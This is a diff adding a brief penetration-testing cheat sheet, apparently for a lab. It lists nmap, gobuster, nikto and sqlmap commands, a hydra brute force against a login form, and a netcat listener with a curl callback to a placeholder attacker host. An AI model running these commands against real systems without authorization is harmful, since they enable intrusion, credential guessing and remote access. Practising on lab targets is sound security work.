@@ -1,0 +1,21 @@
+Recon
+  nmap -sn 192.168.56.0/24
+  nmap -sV -sC -p- 127.0.0.1
+  whatweb http://TARGET
+
+Web enum
+  gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt
+  nikto -h http://TARGET
+
+SQLi
+  sqlmap -u "http://TARGET/rest/products/search?q=test" --dbs --batch
+
+Brute force (authorized testing only)
+  hydra -l admin -P wordlists.txt TARGET http-post-form \
+    "/login:email=^USER^&password=^PASS^:S=Logout"
+
+Post-exploitation
+  nc -lvnp 4444
+  curl http://ATTACKER:4444 # trigger from target
+
+
